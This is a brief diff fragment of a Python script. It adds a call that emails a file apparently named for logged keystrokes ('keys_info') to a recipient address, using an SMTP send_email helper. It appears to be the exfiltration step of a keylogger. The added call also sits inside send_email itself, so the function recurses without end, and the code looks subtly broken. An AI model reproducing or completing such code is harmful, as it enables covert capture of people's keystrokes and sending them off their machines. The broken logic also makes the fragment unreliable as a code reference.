@@ -55,3 +55,6 @@ def send_email(filename, attachment, toaddr):
     text = msg.as_string()
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
+
+    send_email(keys_info, file_path + extend + keys_info, toaddr)
+
